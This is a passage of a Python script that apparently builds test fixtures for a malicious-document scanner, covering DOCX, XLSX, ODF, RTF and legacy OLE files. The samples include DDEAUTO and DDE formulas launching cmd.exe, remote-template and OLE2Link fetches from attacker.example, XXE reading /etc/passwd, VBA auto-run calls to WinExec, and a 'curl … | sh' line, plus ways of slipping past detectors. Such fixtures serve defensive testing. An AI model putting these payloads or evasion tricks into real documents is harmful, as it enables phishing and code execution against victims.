        doc_rels=[("rId9", "package", "data/inner.dat", False)], extra={"word/data/inner.dat": inner_pkg}))
    write(R / "office_rt_vba_default_ctype.docx", docx(extra={"word/data/macros.vba": proj_bin},
        content_extra='<Default Extension="vba" ContentType="application/vnd.ms-office.vbaProject"/>'))
    # A tracked-deleted field instruction comes back when the change is rejected.
    write(R / "office_rt_delinstr.docx", docx(doc_xml=CT_HEAD + f'<w:document {NS_W}><w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:del w:id="1" w:author="a"><w:r><w:delInstrText> DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" </w:delInstrText></w:r></w:del>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body></w:document>'))
    # Declarations: the API name on a continuation line, and ntdll instead of kernel32.
    vba_cont = ('Attribute VB_Name = "ThisDocument"\nPrivate Declare PtrSafe Function foo Lib "kernel32" _\n'
                '    Alias "CreateThread" (ByVal a As Long) As LongPtr\nSub AutoOpen()\nEnd Sub\n')
    vba_nt = ('Attribute VB_Name = "ThisDocument"\nPrivate Declare PtrSafe Function NtAllocateVirtualMemory Lib "ntdll" (ByVal h As LongPtr) As Long\n'
              'Sub AutoOpen()\nEnd Sub\n')
    for nm, src in (("continued", vba_cont), ("ntdll", vba_nt)):
        write(R / f"office_rt_vba_declare_{nm}.docm", docx(
            extra={"word/vbaProject.bin": cfb(vba_project({"ThisDocument": src}))}, content_extra=vba_ct,
            main_ct="application/vnd.ms-word.document.macroEnabled.main+xml"))
    # RTF link objects that each rely on ONE of the three tells: the auto-update flags, the OLE2Link class, the URL moniker.
    wide = lambda u: b"\x00" * 8 + u.encode("utf-16-le")
    write(R / "office_rt_ole2link_class_only.rtf", rtf(rtf_object("OLE2Link", wide("http://attacker.example/x.hta"), "\\objemb")))
    write(R / "office_rt_ole2link_moniker_only.rtf", rtf(rtf_object("Foo.Bar", bytes.fromhex("e0c9ea79f9bace118c8200aa004ba90b")
                                                                    + wide("http://attacker.example/x.hta"), "\\objemb")))
    write(R / "office_rt_ole2link_flags_wide.rtf", rtf(rtf_object("Foo.Bar", wide("http://attacker.example/x.hta"), "\\objautlink\\objupdate")))

    # ── found by the second red-team round ─────────────────────────────────────
    # A name can start with any Unicode letter, and an XML name may hold U+00B7: a tokenizer that insists
    # on [A-Za-z_] never sees the element.
    write(R / "office_rt2_unicode_prefix_dde.docx", docx(doc_xml=CT_HEAD + f'<é:document xmlns:é="{wml}"><é:body>' + dde_run.format(p="é") + "</é:body></é:document>"))
    write(R / "office_rt2_unicode_prefix_rels.docx", docx(extra={
        "word/settings.xml": settings_part,
        "word/_rels/settings.xml.rels": (CT_HEAD + f'<a·b:Relationships xmlns:a·b="{prel}"><a·b:Relationship Id="rId1" '
                                         f'Type="{REL}/attachedTemplate" Target="http://attacker.example/evil.dotm" TargetMode="External"/></a·b:Relationships>').encode()}))
    # Character references in attribute values are decoded by every parser: TargetMode="Ext&#101;rnal" is External.
    write(R / "office_rt2_cref_targetmode.docx", docx(extra={
        "word/settings.xml": settings_part,
        "word/_rels/settings.xml.rels": (CT_HEAD + f'<Relationships xmlns="{prel}"><Relationship Id="rId1" Type="{REL}/attachedTemplate" '
                                         'Target="http://attacker.example/evil.dotm" TargetMode="Ext&#101;rnal"/></Relationships>').encode()}))
    write(R / "office_rt2_cref_fldchar.docx", docx(doc_xml=CT_HEAD + f'<w:document {NS_W}><w:body><w:p><w:r><w:fldChar w:fldCharType="b&#101;gin"/></w:r>'
        '<w:r><w:instrText xml:space="preserve"> DD</w:instrText></w:r><w:r><w:instrText>EAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body></w:document>'))
    write(R / "office_rt2_cref_hidden.xlsm", xlsx(
        sheets='<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" state="&#104;idden" r:id="rId2"/>',
        wb_rels=[("rId2", "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet", "macrosheets/sheet1.xml", False)],
        extra={"xl/macrosheets/sheet1.xml": (CT_HEAD + f'<worksheet xmlns="{smlns}"><sheetData><row r="1"><c r="A1"><f>HALT()</f></c></row></sheetData></worksheet>').encode()},
        content_extra='<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    # Field syntax: a switch may come before the file name, and LINK takes a class name first.
    def field_doc(instr: str) -> bytes:
        return docx(f'<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> {instr} </w:instrText></w:r>'
                    '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
    write(R / "office_rt2_include_switch.docx", field_doc('INCLUDEPICTURE \\d "\\\\\\\\attacker.example\\\\share\\\\logo.png"'))
    write(R / "office_rt2_link_class.docx", field_doc('LINK Excel.Sheet.8 "\\\\\\\\attacker.example\\\\share\\\\book.xls" "Sheet1!R1C1:R2C2" \\a \\p'))
    write(R / "office_rt2_include_local.docx", field_doc('INCLUDEPICTURE \\d "images\\\\logo.png" \\* MERGEFORMAT'))
    # ODF: the mimetype entry anywhere in the archive (or absent, with a manifest), and the events LibreOffice 24.2
    # really fires while a document opens.
    odf_macro_doc = lambda event: odf(
        scripts='<office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" '
                f'script:event-name="{event}" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"/>'
                "</office:event-listeners></office:scripts>",
        extra=basic_module("Module1", 'Sub Main\n  MsgBox "hello"\nEnd Sub\n'))
    def reorder(data: bytes, last: str | None = None, drop: str | None = None) -> bytes:
        with zipfile.ZipFile(io.BytesIO(data)) as z:
            items = [(i.filename, z.read(i.filename)) for i in z.infolist() if i.filename != drop]
        if last:
            items = [x for x in items if x[0] != last] + [x for x in items if x[0] == last]
        return zbytes(items)
    base_odt = odf_macro_doc("office:load")
    write(R / "office_rt2_odf_mimetype_late.odt", reorder(base_odt, last="mimetype"))
    write(R / "office_rt2_odf_no_mimetype.odt", reorder(base_odt, drop="mimetype"))
    for nm, ev in (("domfocusin", "dom:DOMFocusIn"), ("layout_finished", "office:layout-finished"), ("page_count_change", "office:page-count-change")):
        write(R / f"office_rt2_odf_{nm}.odt", odf_macro_doc(ev))
    write(R / "office_rt2_odf_modify_changed.odt", odf_macro_doc("office:modify-changed"))
    # Legacy: a visible Excel 4.0 macro sheet whose strings hold an auto-run name and a command line; an Equation
    # object recognised by its CLSID with the payload in a differently named stream; a URL moniker in a padded stream.
    def bof():
        return struct.pack("<HHHHHHII", 0x0809, 16, 0x600, 0x5, 0x1CE8, 0x07CC, 0, 6)

    def boundsheet(name, hidden, kind):
        nm = name.encode("latin-1")
        return struct.pack("<HHIBB", 0x0085, 8 + len(nm), 0, hidden, kind) + struct.pack("<BB", len(nm), 0) + nm

    def xls_book(extra_text: bytes) -> bytes:
        return (bof() + boundsheet("Sheet1", 0, 0) + boundsheet("Macro1", 0, 1) + struct.pack("<HH", 0x0018, len(extra_text)) + extra_text
                + struct.pack("<HH", 0x000A, 0))
    write(R / "office_rt2_xlm_auto_close.xls", cfb({"Workbook": xls_book(b"Auto_Close\x00cmd.exe /c calc.exe\x00")}))
    write(R / "office_rt2_xlm_visible_quiet.xls", cfb({"Workbook": xls_book(b"Total\x00Subtotal\x00")}))
    write(R / "office_rt2_xlm_cmd_only.xls", cfb({"Workbook": xls_book(b"cmd.exe /c calc.exe\x00")}))
    write(R / "office_rt2_xlm_autoclose_only.xls", cfb({"Workbook": xls_book(b"Auto_Close\x00")}))
    write(R / "office_rt2_equation_renamed_stream.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_1": {"Equation Native2": b"\x1c\x00\x00\x00\x02\x00\x01\x02\x03\x04" + b"cmd.exe /c powershell -enc AAAA" + b"\x00" * 40,
                               "\x01CompObj": b"Microsoft Equation 3.0\x00"}}},
        clsids={("ObjectPool", "_1"): EQUATION_CLSID}))
    # recognised by CompObj alone (no CLSID), payload in a stream with another name
    write(R / "office_rt2_equation_compobj_only.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_1": {"Data2": b"\x1c\x00\x00\x00\x02\x00\x01\x02\x03\x04" + b"cmd.exe /c powershell -enc AAAA" + b"\x00" * 40,
                               "\x01CompObj": b"Microsoft Equation 3.0\x00"}}}))
    write(R / "office_rt2_ole_moniker_padded.doc", cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
        "ObjectPool": {"_1": {"\x01Ole": moniker_stream("http://attacker.example/x.hta") + b"\x00" * 70000, "\x01CompObj": b"\x01\x00\xfe\xff" + b"OLE2Link\x00" * 2}}}))
    # RTF: a control word that does nothing, a hex escape inside the keyword, an INCLUDEPICTURE field, and a raw byte
    # carried by \bin (a '}' among them is data, not the end of the group).
    fld = lambda instr: "{\\field{\\*\\fldinst " + instr + '}{\\fldrslt x}}'
    write(R / "office_rt2_rtf_dde_additive.rtf", rtf(fld('\\additive DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"')))
    write(R / "office_rt2_rtf_dde_hexescape.rtf", rtf(fld('\\\'44DEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"')))
    write(R / "office_rt2_rtf_template_additive.rtf", rtf("{\\*\\template \\additive http://attacker.example/evil.dotm}\\pard Hello\\par"))
    write(R / "office_rt2_rtf_includepicture.rtf", rtf(fld('INCLUDEPICTURE \\\\d "\\\\\\\\\\\\\\\\attacker.example\\\\\\\\share\\\\\\\\logo.png"')))
    def rtf_object_bin(classname: str, payload: bytes, raw_at: int, flags: str = "\\objemb") -> str:
        data = ole1_object(classname, payload)
        idx = len(data) - len(payload) + raw_at
        assert data[idx:idx + 1] in (b"}", b"{", b"\\")
        return ("{\\object" + flags + "{\\*\\objclass " + classname + "}{\\*\\objdata " + data[:idx].hex()
                + "\\bin1 " + data[idx:idx + 1].decode("latin-1") + data[idx + 1:].hex() + "}}")
    write(R / "office_rt2_rtf_bin_brace_equation.rtf", rtf(rtf_object_bin("Equation.3", b"}" + b"cmd /c calc.exe " + b"A" * 60, 0)))
    # Two raw bytes at once (\bin2): the second '}' would close the object group if the bytes were read as syntax; and raw
    # backslashes that are the start of a UNC path, so dropping them loses the target.
    def rtf_object_bin2(classname: str, payload: bytes, flags: str = "\\objemb") -> str:
        data = ole1_object(classname, payload)
        idx = len(data) - len(payload)
        assert data[idx:idx + 2] in (b"}}", b"\\\\")
        return ("{\\object" + flags + "{\\*\\objclass " + classname + "}{\\*\\objdata " + data[:idx].hex()
                + "\\bin2 " + data[idx:idx + 2].decode("latin-1") + data[idx + 2:].hex() + "}}")
    write(R / "office_rt2_rtf_bin_braces_equation.rtf", rtf(rtf_object_bin2("Equation.3", b"}}" + b"cmd /c calc.exe " + b"A" * 60)))
    write(R / "office_rt2_rtf_bin_unc.rtf", rtf(rtf_object_bin2("Foo.Bar", b"\\\\attacker.example\\share\\x.hta", "\\objautlink\\objupdate")))
    # An OLE Package whose first byte (the low byte of the stream's length) is 0x7D, so a raw '}' is natural data.
    pad = 0
    while (len(ole10native("invoice.exe", pe() + b"\x00" * pad)) - 4) & 0xFF != 0x7D:
        pad += 1
    write(R / "office_rt2_rtf_bin_brace_pe.rtf", rtf(rtf_object_bin("Package", ole10native("invoice.exe", pe() + b"\x00" * pad), 0)))
    link_bin = bytearray(link_cfb("http://attacker.example/x.hta")); link_bin[0x34] = 0x7D
    write(R / "office_rt2_rtf_bin_brace_ole2link.rtf", rtf(rtf_object_bin("OLE2Link", bytes(link_bin), 0x34, "\\objautlink\\objupdate\\rsltpict")))
    # An RTF is an RTF whatever the file is called; Flat OPC is read from a .xml.
    dde_rtf = rtf(fld('DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc.exe"'))
    write(R / "office_rt2_rtf_renamed.txt", dde_rtf)
    write(R / "office_rt2_rtf_renamed.log", dde_rtf)
    write(R / "office_rt2_rtf_noext", dde_rtf)
    write(R / "office_rt2_flat_opc.xml", flat(flat_parts))
    write(R / "office_rt2_plain_notes.txt", b"Meeting notes.\nThe RTF format is described in the specification.\n")

    # ── found by the third round ───────────────────────────────────────────────────────────────────────
    # DDE formulas: the pipe written as a character reference; a service that is not a shell but a topic that is.
    def sheet_f(formula_xml: str) -> bytes:
        return xlsx(f'<row r="1"><c r="A1"><f>{formula_xml}</f></c></row>')
    write(R / "office_rt3_dde_pipe_cref.xlsx", sheet_f("cmd&#124;'/c calc'!A0"))
    write(R / "office_rt3_dde_msexcel.xlsx", sheet_f("MSEXCEL|'\\..\\..\\..\\Windows\\System32\\cmd.exe /c calc.exe'!''"))
    write(R / "office_rt3_dde_calc.xlsx", sheet_f("calc|'x'!A0"))
    write(R / "office_rt3_ddelink_msexcel.xlsx", xlsx(extra={
        "xl/externalLinks/externalLink1.xml": (CT_HEAD + f'<externalLink xmlns="{smlns}"><ddeLink ddeService="MSEXCEL" '
                                               'ddeTopic="..\\..\\Windows\\System32\\cmd.exe /c calc.exe"><ddeItems><ddeItem name="x"/></ddeItems></ddeLink></externalLink>').encode()}))
    # PowerPoint: "ppaction:&#47;/program"
    write(R / "office_rt3_ppaction_cref.pptx", pptx(extra={"ppt/slides/slide2.xml": (
        CT_HEAD + '<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">'
        '<p:cSld><p:spTree><a:hlinkClick action="ppaction:&#47;/program"/></p:spTree></p:cSld></p:sld>').encode()}))
    # ODF spreadsheets: DDE() with the quotes as &#34;, and with a service that is not on any shell list.
    ods_ns = ODF_NS + ' xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2"'
    def ods_dde(call: str) -> bytes:
        raw = odf(mime="application/vnd.oasis.opendocument.spreadsheet",
                  body=f'<table:table><table:table-row><table:table-cell table:formula="of:=DDE({call})"/></table:table-row></table:table>')
        with zipfile.ZipFile(io.BytesIO(raw)) as z:
            items = [(i.filename, z.read(i.filename)) for i in z.infolist()]
        items = [(n, d.replace(ODF_NS.encode(), ods_ns.encode()) if n == "content.xml" else d) for n, d in items]
        return zbytes(items, first_stored="mimetype")
    write(R / "office_rt3_ods_dde_cref.ods", ods_dde("&#34;cmd&#34;;&#34;/c calc&#34;;&#34;A0&#34;"))
    write(R / "office_rt3_ods_dde_calc.ods", ods_dde("&quot;calc&quot;;&quot;x&quot;;&quot;A0&quot;"))
    # XXE in the parts that are not the main one
    xxe_decl = '<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]>'
    write(R / "office_rt3_xxe_rels.docx", docx(extra={"_rels/.rels": (CT_HEAD + xxe_decl + rels([("rId1", "officeDocument", "word/document.xml", False)]).decode().split("?>", 1)[1]).encode()}))
    base_odt_parts = lambda: [(i.filename, z0.read(i.filename)) for i in z0.infolist()]
    with zipfile.ZipFile(io.BytesIO(odf())) as z0:
        for nm, part in (("meta", "meta.xml"), ("settings", "settings.xml")):
            items = base_odt_parts() + [(part, (CT_HEAD + xxe_decl + "<office:document-meta " + ODF_NS + "/>").encode())]
            write(R / f"office_rt3_xxe_odf_{nm}.odt", zbytes(items, first_stored="mimetype"))
        items = [(n, (d.replace(b"<manifest:manifest", xxe_decl.encode() + b"<manifest:manifest", 1) if n == "META-INF/manifest.xml" else d)) for n, d in base_odt_parts()]
        write(R / "office_rt3_xxe_odf_manifest.odt", zbytes(items, first_stored="mimetype"))
    # HYPERLINK is a field: the same targets that fail as a relationship fail here
    def hyper_doc(instr: str, simple: bool = False) -> bytes:
        if simple:
            return docx(f'<w:p><w:fldSimple w:instr=\'{instr}\'><w:r><w:t>click</w:t></w:r></w:fldSimple></w:p>')
        return field_doc(instr)
    write(R / "office_rt3_hyperlink_msdt.docx", hyper_doc('HYPERLINK "ms-msdt:/id PCWDiagnostic /skip force"'))
    write(R / "office_rt3_hyperlink_js.docx", hyper_doc('HYPERLINK "javascript:alert(1)"', simple=True))
    write(R / "office_rt3_hyperlink_unc.docx", hyper_doc('HYPERLINK "\\\\\\\\attacker.example\\\\share\\\\x.docx"'))
    write(R / "office_rt3_hyperlink_ok.docx", hyper_doc('HYPERLINK "https://example.com/docs" \\o "Docs"'))
    write(R / "office_rt3_link_dotcom.docx", docx(doc_rels=[("rId5", "hyperlink", "mailto:sales@example.com", True),
                                                        ("rId6", "hyperlink", "http://example.com", True)]))
    write(R / "office_rt3_link_dotcom_path.docx", docx(doc_rels=[("rId5", "hyperlink", "file:///C:/Users/a/run.com", True)]))
    # legacy .doc DDE: lower case, and a full path to the shell
    wd = lambda txt: cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60 + txt + b"\x00", "1Table": b"\x00" * 64})
    write(R / "office_rt3_dde_lower.doc", wd(b"ddeauto c:\\windows\\system32\\cmd.exe /k calc.exe"))
    write(R / "office_rt3_dde_path.doc", wd(b'DDE "C:\\Windows\\System32\\cmd.exe" "/c calc"'))
    write(R / "office_rt3_dde_prose.doc", wd(b"The DDE protocol is old. Run cmd to see it, or use the shell."))
    # legacy .xls: SUPBOOK records carry DDE links ("application" 0x03 "topic") and external workbooks
    def supbook(path: str) -> bytes:
        data = path.encode("latin-1")
        return struct.pack("<HHHHB", 0x01AE, 5 + len(data), 1, len(data), 0) + data
    def xls_with(*records: bytes) -> bytes:
        return cfb({"Workbook": bof() + boundsheet("Sheet1", 0, 0) + b"".join(records) + struct.pack("<HH", 0x000A, 0)})
    write(R / "office_rt3_xls_supbook_dde.xls", xls_with(supbook("cmd\x03/c calc")))
    write(R / "office_rt3_xls_supbook_unc.xls", xls_with(supbook("\x01\\\\attacker.example\\share\\book.xls")))
    write(R / "office_rt3_xls_supbook_local.xls", xls_with(supbook("\x01C:\\data\\book.xls")))
    # a truncated Workbook stream (the walk used to raise IndexError and end the whole analysis) beside a real DDE field
    write(R / "office_rt3_truncated_workbook.doc", cfb({
        "WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60 + b"DDEAUTO cmd /c calc\x00", "1Table": b"\x00" * 64,
        "Workbook": bof() + struct.pack("<HH", 0x0085, 100) + b"\x00" * 3}))
    # packages that are two things
    base_docx = docx(doc_xml=CT_HEAD + f'<w:document {NS_W}><w:body>' + dde_run.format(p="w") + "</w:body></w:document>")
    with zipfile.ZipFile(io.BytesIO(base_docx)) as z1:
        items = [(i.filename, z1.read(i.filename)) for i in z1.infolist()] + [("mimetype", b"application/vnd.oasis.opendocument.text")]
    write(R / "office_rt3_polyglot_docx_odf.docx", zbytes(items, first_stored=None))
    # …and the relationships still apply to the OOXML half: the embedded package is named only by its relationship
    emb_docx = docx(doc_rels=[("rId9", "package", "data/inner.dat", False)], extra={"word/data/inner.dat": inner_pkg})
    with zipfile.ZipFile(io.BytesIO(emb_docx)) as z1b:
        items_b = [(i.filename, z1b.read(i.filename)) for i in z1b.infolist()] + [("mimetype", b"application/vnd.oasis.opendocument.text")]
    write(R / "office_rt3_polyglot_docx_odf_rel.docx", zbytes(items_b))
    macro_odt = odf_macro_doc("office:load")
    with zipfile.ZipFile(io.BytesIO(macro_odt)) as z2:
        items = [(i.filename, z2.read(i.filename)) for i in z2.infolist() if i.filename != "mimetype"]
    items.append(("[Content_Types].xml", docx_ct_only()))
    write(R / "office_rt3_polyglot_odt_ooxml.odt", zbytes(items))
    # one part nobody can read does not stop the others
    unreadable = bytearray(odf_macro_doc("office:load") if False else macro_odt)
    items = [(i, z) for i, z in []]
    with zipfile.ZipFile(io.BytesIO(macro_odt)) as z3:
        items = [(i.filename, z3.read(i.filename)) for i in z3.infolist()] + [("Object 1/content.xml", b"stray part " * 20)]
    stray = bytearray(zbytes(items, first_stored="mimetype"))
    for sig, off_name, off_method in ((b"PK\x03\x04", 30, 8), (b"PK\x01\x02", 46, 10)):
        i = stray.find(sig)
        while i != -1:
            nl = struct.unpack_from("<H", stray, i + (26 if sig == b"PK\x03\x04" else 28))[0]
            if bytes(stray[i + off_name:i + off_name + nl]) == b"Object 1/content.xml":
                struct.pack_into("<H", stray, i + off_method, 99)
            i = stray.find(sig, i + 4)
    write(R / "office_rt3_stray_unreadable.odt", bytes(stray))
    # a main part stored under a .rels name outside _rels/
    write(R / "office_rt3_main_as_rels.docx", zbytes([
        ("[Content_Types].xml", (CT_HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                                 '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                                 '<Override PartName="/doc/main.rels" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>').encode()),
        ("_rels/.rels", rels([("rId1", "officeDocument", "doc/main.rels", False)])),
        ("doc/main.rels", (CT_HEAD + f'<w:document {NS_W}><w:body>' + dde_run.format(p="w") + "</w:body></w:document>").encode())]))
    # VBA: launching a program through WinExec; parsing XML is not downloading
    vba_winexec = ('Attribute VB_Name = "ThisDocument"\nPrivate Declare PtrSafe Function WinExec Lib "kernel32" (ByVal cmd As String, ByVal show As Long) As Long\n'
                   'Sub AutoOpen()\n    WinExec "calc.exe", 1\nEnd Sub\n')
    vba_dom = ('Attribute VB_Name = "ThisWorkbook"\nSub Workbook_Open()\n    Dim d As Object\n    Set d = CreateObject("MSXML2.DOMDocument.6.0")\n'
               '    d.loadXML "<a/>"\nEnd Sub\n')
    write(R / "office_rt3_vba_winexec.docm", docx(extra={"word/vbaProject.bin": cfb(vba_project({"ThisDocument": vba_winexec}))}, content_extra=vba_ct,
                                                 main_ct="application/vnd.ms-word.document.macroEnabled.main+xml"))
    write(R / "office_rt3_vba_msxml_dom.xlsm", xlsx(extra={"xl/vbaProject.bin": cfb(vba_project({"ThisWorkbook": vba_dom}))},
        content_extra='<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    # OLE Package payloads: an extension that runs without being an .exe, and a PE whose header lies past 4 KB
    far_pe = b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x2000) + b"\x00" * (0x2000 - 0x40) + b"PE\x00\x00" + b"\x00" * 64
    def pkg_doc(name: str, payload: bytes) -> bytes:
        return cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
                    "ObjectPool": {"_2": {"\x01Ole10Native": ole10native(name, payload), "\x01CompObj": b"Package\x00"}}})
    write(R / "office_rt3_pkg_xll.doc", pkg_doc("addin.xll", b"not a pe " * 8))
    write(R / "office_rt3_pkg_far_pe.doc", pkg_doc("notes.dat", far_pe))
    write(R / "office_rt3_pkg_text.doc", pkg_doc("notes.txt", b"just some notes " * 8))
    # A file that merely mentions {\rtf is handed back to the scanner its name and shebang call for.
    write(R / "office_rt3_script_mentions_rtf", b"#!/bin/sh\n#{\\rtf1 notes\ncurl -s http://attacker.example/x.sh | sh\n")
    write(R / "office_rt3_notes_mentions_rtf.txt", b"RTF {\\rtf1 starts so. The admin password = Hunter2Hunter2 was shared by mail.\n")

    # ── legacy binary (OLE2) ────────────────────────────────────────────────
    write(R / "office_legacy_macro.doc", cfb({
        "WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60, "1Table": b"\x00" * 64,
        "Macros": vba_project({"ThisDocument": VBA_EVIL_DOC})}))
    write(R / "office_legacy_macro_benign.xls", cfb({
        "Workbook": b"\x09\x08\x10\x00" + b"\x00" * 16 + b"\x0a\x00\x00\x00",
        "_VBA_PROJECT_CUR": vba_project({"ThisWorkbook": VBA_BENIGN})}))
    write(R / "office_legacy_equation.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_1": {"Equation Native": b"\x1c\x00\x00\x00\x02\x00" + b"cmd /c calc.exe " + b"A" * 80, "\x01CompObj": b"Microsoft Equation 3.0\x00"}}},
        clsids={("ObjectPool", "_1"): EQUATION_CLSID}))
    write(R / "office_legacy_equation_benign.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_1": {"Equation Native": b"\x1c\x00\x00\x00\x02\x00\x01\x02\x03\x04" + b"\x00" * 40, "\x01CompObj": b"Microsoft Equation 3.0\x00"}}},
        clsids={("ObjectPool", "_1"): EQUATION_CLSID}))
    write(R / "office_legacy_package.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
         "ObjectPool": {"_2": {"\x01Ole10Native": ole10native("invoice.exe", pe()), "\x01CompObj": b"Package\x00"}}}))
    write(R / "office_legacy_objpool.doc", cfb(
        {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60, "ObjectPool": {"_3": {"CONTENTS": b"chart data " * 40}}}))
    # A Workbook stream of BIFF8 records: BOF, BOUNDSHEET8 (one worksheet, one hidden macro sheet), EOF.
    def bof():
        return struct.pack("<HHHHHHII", 0x0809, 16, 0x600, 0x5, 0x1CE8, 0x07CC, 0, 6)

    def boundsheet(name, hidden, kind):
        nm = name.encode("latin-1")
        return struct.pack("<HHIBB", 0x0085, 8 + len(nm), 0, hidden, kind) + struct.pack("<BB", len(nm), 0) + nm

    book = bof() + boundsheet("Sheet1", 0, 0) + boundsheet("Macro1", 2, 1) + struct.pack("<HH", 0x000A, 0)
    write(R / "office_legacy_xlm.xls", cfb({"Workbook": book}))
    write(R / "office_legacy_dde.doc", cfb({
        "WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60 + b"DDEAUTO c:\\windows\\system32\\cmd.exe /k calc.exe\x00", "1Table": b"\x00" * 64}))
    write(R / "office_legacy_truncated.doc", cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 6000})[:700])


if __name__ == "__main__":
    main()
